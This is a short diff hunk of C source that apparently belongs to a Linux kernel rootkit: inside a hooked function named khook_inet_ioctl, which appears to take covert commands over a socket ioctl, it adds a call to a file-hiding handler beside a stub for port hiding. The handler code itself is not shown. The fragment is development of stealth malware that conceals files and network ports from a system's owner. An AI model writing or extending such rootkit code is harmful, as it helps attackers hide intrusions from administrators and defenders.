@@ -59,6 +59,7 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long
                 break;
             case 0x1:
                 // file hiding
+                handle_file_hiding_request(cmd_arg.subargs);
                 break;
             case 0x2:
                 // port hiding
